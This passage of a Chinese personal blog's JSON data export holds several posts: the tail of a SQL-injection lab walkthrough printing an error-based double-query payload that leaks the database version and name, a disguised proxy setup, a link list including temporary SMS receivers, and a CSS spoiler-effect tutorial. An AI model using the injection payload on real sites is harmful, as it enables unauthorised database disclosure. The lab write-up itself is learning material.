Quotes</code>，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个<code>You are in...........</code>，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。</p>\n<p>​    双查询注入也是我第一次听，贴一个讲大致原理的帖子：<a href=\"https://blog.csdn.net/Leep0rt/article/details/78556440\">点我</a>。</p>\n<p>​    构造语句：</p>\n<p><code>?id=&#39; union select 1,2,3 from (select 1,count(*),concat_ws(&#39;____________&#39;,floor(rand()*2),concat_ws(&#39;********&#39;,version(),database()))a from information_schema.tables group by a)b --+</code></p>\n<p>​    讲一下<code>CONCAT_WS(separator,str1,str2,…)</code>函数的用法：把<code>str1</code>、<code>str2</code>连接起来，并使用<code>separator</code>做分隔符。</p>\n"},{"title":"搭窝过程(二)","date":"2020-09-02T14:05:34.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120853.png","_content":"\n​\t服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。\n\n​\t还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个[项目](https://github.com/ShadowsocksR-Live/shadowsocksr-native)，使用的技术大概就是反向代理+Https的协议，这里就不细讲了~~主要是害怕~~，可以自己到项目去看看。\n\n​\t在这里还学会了搞[Let's Encrypt](https://letsencrypt.org/)的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。","source":"_posts/搭窝过程(二).md","raw":"---\ntitle: 搭窝过程(二)\ndate: 2020-09-02 22:05:34\ncategories:\n - 流水账\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120853.png\n---\n\n​\t服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。\n\n​\t还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个[项目](https://github.com/ShadowsocksR-Live/shadowsocksr-native)，使用的技术大概就是反向代理+Https的协议，这里就不细讲了~~主要是害怕~~，可以自己到项目去看看。\n\n​\t在这里还学会了搞[Let's Encrypt](https://letsencrypt.org/)的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。","slug":"搭窝过程(二)","published":1,"updated":"2021-12-30T09:42:54.202Z","_id":"ckrr3f9b9001qhotcfeksex93","comments":1,"layout":"post","photos":[],"link":"","content":"<p>​    服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。</p>\n<p>​    还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个<a href=\"https://github.com/ShadowsocksR-Live/shadowsocksr-native\">项目</a>，使用的技术大概就是反向代理+Https的协议，这里就不细讲了<del>主要是害怕</del>，可以自己到项目去看看。</p>\n<p>​    在这里还学会了搞<a href=\"https://letsencrypt.org/\">Let’s Encrypt</a>的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>​    服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。</p>\n<p>​    还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个<a href=\"https://github.com/ShadowsocksR-Live/shadowsocksr-native\">项目</a>，使用的技术大概就是反向代理+Https的协议，这里就不细讲了<del>主要是害怕</del>，可以自己到项目去看看。</p>\n<p>​    在这里还学会了搞<a href=\"https://letsencrypt.org/\">Let’s Encrypt</a>的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。</p>\n"},{"title":"用的顺手的网站","date":"2021-07-31T00:52:16.000Z","_content":"\n# 工具网站\n\n[nginx配置生成](http://do.co/nginxconfig)\n\n[万词王 WantWords](https://wantwords.thunlp.org/)\n\n[Learn Git Branching](https://learngitbranching.js.org/?locale=zh_CN)\n\n# 视频解析接口\n\nhttps://vip.parwix.com:4433/player/?url=\n\n---\n\n# 云短信、云邮件\n\n* 短信\n\n[云短信 - 在线短信接收](https://www.materialtools.com/)\n\n[（永久免费）短信验证码在线接收码平台 - 隐私短信 www.yinsiduanxin.com](https://www.yinsiduanxin.com/)\n\n* 邮件\n\n[10 Minute Mail - Free Anonymous Temporary email - 10 Minute Mail - Free Anonymous Temporary email](https://10minutemail.com/)\n\n[10分钟邮箱](https://10minutemail.net/)\n\n---\n\n# 看动漫的网站\n\n[迅播动漫影院-无需迅播的动漫网!](https://www.xbdm.org/)\n\n[风车动漫－专注动漫的门户网站](http://www.fengchedm.com/)\n\n[在线动画 动漫下载 - AGE动漫](https://www.agefans.tv/)\n\n[布丁动画官网_布丁动漫_布丁520 - 布丁动画](http://www.buding520.com/)\n\n[樱花动漫手机版-专注动漫的门户网站](http://m.imomoe.io/)\n\n[轻小说文库 - 最新最全的日本动漫轻小说在线阅读与下载基地](https://www.wenku8.net/index.php)\n\n# TZ\n\n[free proxies抓取 - Google 搜索](https://www.google.com/search?q=free+proxies抓取&sxsrf=ALeKk03Bm-wm1KnE4G6nbA9EHhzW06hi2A%3A1627526808647&ei=mBYCYdzVJtmEr7wPw9-E-A8)\n\n[ACL4SSR 在线订阅转换](https://acl4ssr-sub.github.io/)\n\n[免费节点](https://guobang.herokuapp.com/)(可能因为长时间没人访问应用要启动一下，稍等会)","source":"_posts/用的顺手的网站.md","raw":"---\ntitle: 用的顺手的网站\ndate: 2021-07-31 08:52:16\ncategories:\n - 分享\ntags:\n - 黑科技\n---\n\n# 工具网站\n\n[nginx配置生成](http://do.co/nginxconfig)\n\n[万词王 WantWords](https://wantwords.thunlp.org/)\n\n[Learn Git Branching](https://learngitbranching.js.org/?locale=zh_CN)\n\n# 视频解析接口\n\nhttps://vip.parwix.com:4433/player/?url=\n\n---\n\n# 云短信、云邮件\n\n* 短信\n\n[云短信 - 在线短信接收](https://www.materialtools.com/)\n\n[（永久免费）短信验证码在线接收码平台 - 隐私短信 www.yinsiduanxin.com](https://www.yinsiduanxin.com/)\n\n* 邮件\n\n[10 Minute Mail - Free Anonymous Temporary email - 10 Minute Mail - Free Anonymous Temporary email](https://10minutemail.com/)\n\n[10分钟邮箱](https://10minutemail.net/)\n\n---\n\n# 看动漫的网站\n\n[迅播动漫影院-无需迅播的动漫网!](https://www.xbdm.org/)\n\n[风车动漫－专注动漫的门户网站](http://www.fengchedm.com/)\n\n[在线动画 动漫下载 - AGE动漫](https://www.agefans.tv/)\n\n[布丁动画官网_布丁动漫_布丁520 - 布丁动画](http://www.buding520.com/)\n\n[樱花动漫手机版-专注动漫的门户网站](http://m.imomoe.io/)\n\n[轻小说文库 - 最新最全的日本动漫轻小说在线阅读与下载基地](https://www.wenku8.net/index.php)\n\n# TZ\n\n[free proxies抓取 - Google 搜索](https://www.google.com/search?q=free+proxies抓取&sxsrf=ALeKk03Bm-wm1KnE4G6nbA9EHhzW06hi2A%3A1627526808647&ei=mBYCYdzVJtmEr7wPw9-E-A8)\n\n[ACL4SSR 在线订阅转换](https://acl4ssr-sub.github.io/)\n\n[免费节点](https://guobang.herokuapp.com/)(可能因为长时间没人访问应用要启动一下，稍等会)","slug":"用的顺手的网站","published":1,"updated":"2021-12-30T14:36:40.339Z","_id":"ckrr3f9bc001thotcc6ht38fm","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"工具网站\"><a href=\"#工具网站\" class=\"headerlink\" title=\"工具网站\"></a>工具网站</h1><p><a href=\"http://do.co/nginxconfig\">nginx配置生成</a></p>\n<p><a href=\"https://wantwords.thunlp.org/\">万词王 WantWords</a></p>\n<p><a href=\"https://learngitbranching.js.org/?locale=zh_CN\">Learn Git Branching</a></p>\n<h1 id=\"视频解析接口\"><a href=\"#视频解析接口\" class=\"headerlink\" title=\"视频解析接口\"></a>视频解析接口</h1><p><a href=\"https://vip.parwix.com:4433/player/?url=\">https://vip.parwix.com:4433/player/?url=</a></p>\n<hr>\n<h1 id=\"云短信、云邮件\"><a href=\"#云短信、云邮件\" class=\"headerlink\" title=\"云短信、云邮件\"></a>云短信、云邮件</h1><ul>\n<li>短信</li>\n</ul>\n<p><a href=\"https://www.materialtools.com/\">云短信 - 在线短信接收</a></p>\n<p><a href=\"https://www.yinsiduanxin.com/\">（永久免费）短信验证码在线接收码平台 - 隐私短信 www.yinsiduanxin.com</a></p>\n<ul>\n<li>邮件</li>\n</ul>\n<p><a href=\"https://10minutemail.com/\">10 Minute Mail - Free Anonymous Temporary email - 10 Minute Mail - Free Anonymous Temporary email</a></p>\n<p><a href=\"https://10minutemail.net/\">10分钟邮箱</a></p>\n<hr>\n<h1 id=\"看动漫的网站\"><a href=\"#看动漫的网站\" class=\"headerlink\" title=\"看动漫的网站\"></a>看动漫的网站</h1><p><a href=\"https://www.xbdm.org/\">迅播动漫影院-无需迅播的动漫网!</a></p>\n<p><a href=\"http://www.fengchedm.com/\">风车动漫－专注动漫的门户网站</a></p>\n<p><a href=\"https://www.agefans.tv/\">在线动画 动漫下载 - AGE动漫</a></p>\n<p><a href=\"http://www.buding520.com/\">布丁动画官网_布丁动漫_布丁520 - 布丁动画</a></p>\n<p><a href=\"http://m.imomoe.io/\">樱花动漫手机版-专注动漫的门户网站</a></p>\n<p><a href=\"https://www.wenku8.net/index.php\">轻小说文库 - 最新最全的日本动漫轻小说在线阅读与下载基地</a></p>\n<h1 id=\"TZ\"><a href=\"#TZ\" class=\"headerlink\" title=\"TZ\"></a>TZ</h1><p><a href=\"https://www.google.com/search?q=free+proxies%E6%8A%93%E5%8F%96&sxsrf=ALeKk03Bm-wm1KnE4G6nbA9EHhzW06hi2A:1627526808647&ei=mBYCYdzVJtmEr7wPw9-E-A8\">free proxies抓取 - Google 搜索</a></p>\n<p><a href=\"https://acl4ssr-sub.github.io/\">ACL4SSR 在线订阅转换</a></p>\n<p><a href=\"https://guobang.herokuapp.com/\">免费节点</a>(可能因为长时间没人访问应用要启动一下，稍等会)</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"工具网站\"><a href=\"#工具网站\" class=\"headerlink\" title=\"工具网站\"></a>工具网站</h1><p><a href=\"http://do.co/nginxconfig\">nginx配置生成</a></p>\n<p><a href=\"https://wantwords.thunlp.org/\">万词王 WantWords</a></p>\n<p><a href=\"https://learngitbranching.js.org/?locale=zh_CN\">Learn Git Branching</a></p>\n<h1 id=\"视频解析接口\"><a href=\"#视频解析接口\" class=\"headerlink\" title=\"视频解析接口\"></a>视频解析接口</h1><p><a href=\"https://vip.parwix.com:4433/player/?url=\">https://vip.parwix.com:4433/player/?url=</a></p>\n<hr>\n<h1 id=\"云短信、云邮件\"><a href=\"#云短信、云邮件\" class=\"headerlink\" title=\"云短信、云邮件\"></a>云短信、云邮件</h1><ul>\n<li>短信</li>\n</ul>\n<p><a href=\"https://www.materialtools.com/\">云短信 - 在线短信接收</a></p>\n<p><a href=\"https://www.yinsiduanxin.com/\">（永久免费）短信验证码在线接收码平台 - 隐私短信 www.yinsiduanxin.com</a></p>\n<ul>\n<li>邮件</li>\n</ul>\n<p><a href=\"https://10minutemail.com/\">10 Minute Mail - Free Anonymous Temporary email - 10 Minute Mail - Free Anonymous Temporary email</a></p>\n<p><a href=\"https://10minutemail.net/\">10分钟邮箱</a></p>\n<hr>\n<h1 id=\"看动漫的网站\"><a href=\"#看动漫的网站\" class=\"headerlink\" title=\"看动漫的网站\"></a>看动漫的网站</h1><p><a href=\"https://www.xbdm.org/\">迅播动漫影院-无需迅播的动漫网!</a></p>\n<p><a href=\"http://www.fengchedm.com/\">风车动漫－专注动漫的门户网站</a></p>\n<p><a href=\"https://www.agefans.tv/\">在线动画 动漫下载 - AGE动漫</a></p>\n<p><a href=\"http://www.buding520.com/\">布丁动画官网_布丁动漫_布丁520 - 布丁动画</a></p>\n<p><a href=\"http://m.imomoe.io/\">樱花动漫手机版-专注动漫的门户网站</a></p>\n<p><a href=\"https://www.wenku8.net/index.php\">轻小说文库 - 最新最全的日本动漫轻小说在线阅读与下载基地</a></p>\n<h1 id=\"TZ\"><a href=\"#TZ\" class=\"headerlink\" title=\"TZ\"></a>TZ</h1><p><a href=\"https://www.google.com/search?q=free+proxies%E6%8A%93%E5%8F%96&sxsrf=ALeKk03Bm-wm1KnE4G6nbA9EHhzW06hi2A:1627526808647&ei=mBYCYdzVJtmEr7wPw9-E-A8\">free proxies抓取 - Google 搜索</a></p>\n<p><a href=\"https://acl4ssr-sub.github.io/\">ACL4SSR 在线订阅转换</a></p>\n<p><a href=\"https://guobang.herokuapp.com/\">免费节点</a>(可能因为长时间没人访问应用要启动一下，稍等会)</p>\n"},{"title":"第一篇文章","date":"2020-08-26T08:40:03.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120850.jpg","_content":"\n**第一篇文章的内容**\n\n刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。\n","source":"_posts/第一篇文章.md","raw":"---\ntitle: 第一篇文章\ndate: 2020-08-26 16:40:03\ncategories: \n - 流水账\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120850.jpg\n---\n\n**第一篇文章的内容**\n\n刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。\n","slug":"第一篇文章","published":1,"updated":"2021-12-30T09:42:54.203Z","_id":"ckrr3f9bd001xhotc061mavtg","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>第一篇文章的内容</strong></p>\n<p>刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>第一篇文章的内容</strong></p>\n<p>刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。</p>\n"},{"title":"萌娘百科黑幕实现","date":"2020-11-20T02:13:07.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120185535.jpg","_content":"\n\n## 前言\n\n​\t老早就觉得[萌娘百科](https://zh.moegirl.org.cn/Mainpage)里的<span class='heimu'>黑幕</span>很好玩，所以摸索着给自己博客加了一个。参考博客[Re：萌娘百科上的黑幕实现](https://www.cnblogs.com/send-off-a-friend/p/12355387.html)。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线`~~ ~~`标签修改了。我回来又想到了更好的方法，markdown支持文章中的**自定义标签**，自己增加一个`<span class='heimu'>...</span>`标签更好。那么两种都记一下吧。当然用**自定义标签**的话还可以保留**删除线**。\n\n## 示例\n\n<span class='heimu'>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</span>\n\n<span class='heimu'>[我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气]()</span>\n\n<span class='heimu'>~~我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气~~</span>\n\n<span class='heimu'>**我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气**</span>\n\n<span class='heimu'>`我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气`</span>\n\n原博客图\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210818171850.png)\n\n萌娘百科[官方介绍](https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95)\n\n## 准备工作\n\n​\t先进入主题的资源文件夹`themes\\butterfly\\source\\`，修改需要用到的文件`css\\_global\\index.styl`、`js/main.js`。\n\n​\t说明一下两个文件的作用：主题的总样式表`index.css`是经过整合形成的，而**\\.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。`main.js`里面使用选择器为标签添加`title='你知道的太多了'`，这个可以修改成自己喜欢的。\n\n## 修改自定义标签\n\n1. 在`index.styl`文件末尾添加\n\n```stylus\n  .heimu, .heimu a, a .heimu, .heimu a.new, .heimu code\n    background-color: #252525 !important\n    color: #252525 !important\n    text-shadow: none\n  .heimu:hover, .heimu:active,\n  .heimu:hover .heimu, .heimu:active .heimu,.heimu code:hover\n    color: white !important;\n  .heimu:hover a, a:hover .heimu,\n  .heimu:active a, a:active .heimu \n    color: lightblue !important;\n  .heimu:hover .new, .heimu .new:hover, .new:hover .heimu,\n  .heimu:active .new, .heimu .new:active, .new:active .heimu\n    color: #BA0000 !important;\n```\n\n因为是`.styl`的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。\n\n2. 在`main.js`的`unRefreshFn`和`refreshFn`方法之前定义`addheimuTitle`函数\n\n```js\n  //你知道的太多了\n  const addheimuTitle = function(){\n    console.log(123)\n    $('.heimu').attr('title','你知道的太多了')\n  }\n```\n\n可以<kbd>ctrl</kbd>+<kbd>f</kbd>搜索上面那两个`..refreshFn`函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的`addheimuTitle`函数在这里面调用。我盲猜的嗷`refreshFn`这个函数是在载入页面会调用，直接在里面第二行加上\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120173713.png)\n\n\n\n## 修改删除线\n\n​\t修改`css\\_layout\\post.styl`文件，在文件中找到id为`#article-container`的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加\n\n```stylus\n#article-container \n.....\n.....\n  del\n    background-color: #252525;\n    color: #252525;\n    text-shadow: none;\n    text-decoration: none\n    &:hover\n      color: white !important;\n```\n\n​\t因为文章中的删除线被渲染以后页面的标签为`<del>`，选中id为`article-container`下的所有`del`标签添加样式，剩下的还有在`main.js`中添加`title`和上面的方法差不多，只需要把选择器修改为`$('#article-container del').attr('title','你知道的太多了')`。\n\n## 完工\n\n​\t两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。\n\n","source":"_posts/萌娘百科黑幕实现.md","raw":"---\ntitle: 萌娘百科黑幕实现\ndate: 2020-11-20 10:13:07\ncategories:\n- 捣腾博客\ntags:\n- 黑幕实现\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120185535.jpg\n---\n\n\n## 前言\n\n​\t老早就觉得[萌娘百科](https://zh.moegirl.org.cn/Mainpage)里的<span class='heimu'>黑幕</span>很好玩，所以摸索着给自己博客加了一个。参考博客[Re：萌娘百科上的黑幕实现](https://www.cnblogs.com/send-off-a-friend/p/12355387.html)。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线`~~ ~~`标签修改了。我回来又想到了更好的方法，markdown支持文章中的**自定义标签**，自己增加一个`<span class='heimu'>...</span>`标签更好。那么两种都记一下吧。当然用**自定义标签**的话还可以保留**删除线**。\n\n## 示例\n\n<span class='heimu'>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</span>\n\n<span class='heimu'>[我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气]()</span>\n\n<span class='heimu'>~~我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气~~</span>\n\n<span class='heimu'>**我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气**</span>\n\n<span class='heimu'>`我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气`</span>\n\n原博客图\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210818171850.png)\n\n萌娘百科[官方介绍](https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95)\n\n## 准备工作\n\n​\t先进入主题的资源文件夹`themes\\butterfly\\source\\`，修改需要用到的文件`css\\_global\\index.styl`、`js/main.js`。\n\n​\t说明一下两个文件的作用：主题的总样式表`index.css`是经过整合形成的，而**\\.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。`main.js`里面使用选择器为标签添加`title='你知道的太多了'`，这个可以修改成自己喜欢的。\n\n## 修改自定义标签\n\n1. 在`index.styl`文件末尾添加\n\n```stylus\n  .heimu, .heimu a, a .heimu, .heimu a.new, .heimu code\n    background-color: #252525 !important\n    color: #252525 !important\n    text-shadow: none\n  .heimu:hover, .heimu:active,\n  .heimu:hover .heimu, .heimu:active .heimu,.heimu code:hover\n    color: white !important;\n  .heimu:hover a, a:hover .heimu,\n  .heimu:active a, a:active .heimu \n    color: lightblue !important;\n  .heimu:hover .new, .heimu .new:hover, .new:hover .heimu,\n  .heimu:active .new, .heimu .new:active, .new:active .heimu\n    color: #BA0000 !important;\n```\n\n因为是`.styl`的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。\n\n2. 在`main.js`的`unRefreshFn`和`refreshFn`方法之前定义`addheimuTitle`函数\n\n```js\n  //你知道的太多了\n  const addheimuTitle = function(){\n    console.log(123)\n    $('.heimu').attr('title','你知道的太多了')\n  }\n```\n\n可以<kbd>ctrl</kbd>+<kbd>f</kbd>搜索上面那两个`..refreshFn`函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的`addheimuTitle`函数在这里面调用。我盲猜的嗷`refreshFn`这个函数是在载入页面会调用，直接在里面第二行加上\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120173713.png)\n\n\n\n## 修改删除线\n\n​\t修改`css\\_layout\\post.styl`文件，在文件中找到id为`#article-container`的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加\n\n```stylus\n#article-container \n.....\n.....\n  del\n    background-color: #252525;\n    color: #252525;\n    text-shadow: none;\n    text-decoration: none\n    &:hover\n      color: white !important;\n```\n\n​\t因为文章中的删除线被渲染以后页面的标签为`<del>`，选中id为`article-container`下的所有`del`标签添加样式，剩下的还有在`main.js`中添加`title`和上面的方法差不多，只需要把选择器修改为`$('#article-container del').attr('title','你知道的太多了')`。\n\n## 完工\n\n​\t两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。\n\n","slug":"萌娘百科黑幕实现","published":1,"updated":"2021-12-30T09:42:54.204Z","_id":"ckrr3f9be0020hotc2wpa6n1w","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    老早就觉得<a href=\"https://zh.moegirl.org.cn/Mainpage\">萌娘百科</a>里的<span class='heimu'>黑幕</span>很好玩，所以摸索着给自己博客加了一个。参考博客<a href=\"https://www.cnblogs.com/send-off-a-friend/p/12355387.html\">Re：萌娘百科上的黑幕实现</a>。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线<code>~~ ~~</code>标签修改了。我回来又想到了更好的方法，markdown支持文章中的<strong>自定义标签</strong>，自己增加一个<code>&lt;span class=&#39;heimu&#39;&gt;...&lt;/span&gt;</code>标签更好。那么两种都记一下吧。当然用<strong>自定义标签</strong>的话还可以保留<strong>删除线</strong>。</p>\n<h2 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h2><p><span class='heimu'>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</span></p>\n<p><span class='heimu'><a href=\"\">我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</a></span></p>\n<p><span class='heimu'><del>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</del></span></p>\n<p><span class='heimu'><strong>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</strong></span></p>\n<p><span class='heimu'><code>我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气</code></span></p>\n<p>原博客图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210818171850.png\"></p>\n<p>萌娘百科<a href=\"https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95\">官方介绍</a></p>\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>​    先进入主题的资源文件夹<code>themes\\butterfly\\source\\</code>，修改需要用到的文件<code>css\\_global\\index.styl</code>、<code>js/main.js</code>。</p>\n<p>​    说明一下两个文件的作用：主题的总样式表<code>index.css</code>是经过整合形成的，而<strong>.styl文件是基于Node.js的CSS的预处理框架</strong>，我们会在这个里面添加黑幕的样式。<code>main.js</code>里面使用选择器为标签添加<code>title=&#39;你知道的太多了&#39;</code>，这个可以修改成自己喜欢的。</p>\n<h2 id=\"修改自定义标签\"><a href=\"#修改自定义标签\" class=\"headerlink\" title=\"修改自定义标签\"></a>修改自定义标签</h2><ol>\n<li>在<code>index.styl</code>文件末尾添加</li>\n</ol>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.heimu</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">a</span>, <span class=\"selector-tag\">a</span> <span class=\"selector-class\">.heimu</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">a</span><span class=\"selector-class\">.new</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">code</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#252525</span> <span class=\"meta\">!important</span></span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#252525</span> <span class=\"meta\">!important</span></span><br><span class=\"line\">  <span class=\"attribute\">text-shadow</span>: none</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span>, <span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.heimu</span>, <span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.heimu</span>,<span class=\"selector-class\">.heimu</span> <span class=\"selector-tag\">code</span><span class=\"selector-pseudo\">:hover</span></span><br><span class=\"line\">  <span class=\"attribute\">color</span>: white <span class=\"meta\">!important</span>;</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-tag\">a</span>, <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.heimu</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-tag\">a</span>, <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.heimu</span> </span><br><span class=\"line\">  <span class=\"attribute\">color</span>: lightblue <span class=\"meta\">!important</span>;</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.new</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:hover</span>, <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.heimu</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.heimu</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.new</span>, <span class=\"selector-class\">.heimu</span> <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:active</span>, <span class=\"selector-class\">.new</span><span class=\"selector-pseudo\">:active</span> <span class=\"selector-class\">.heimu</span></span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#BA0000</span> <span class=\"meta\">!important</span>;</span><br></pre></td></tr></table></figure>\n\n<p>因为是<code>.styl</code>的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。</p>\n<ol start=\"2\">\n<li>在<code>main.js</code>的<code>unRefreshFn</code>和<code>refreshFn</code>方法之前定义<code>addheimuTitle</code>函数</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//你知道的太多了</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> addheimuTitle = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">123</span>)</span><br><span class=\"line\">  $(<span class=\"string\">&#x27;.heimu&#x27;</span>).attr(<span class=\"string\">&#x27;title&#x27;</span>,<span class=\"string\">&#x27;你知道的太多了&#x27;</span>)</span><br><span 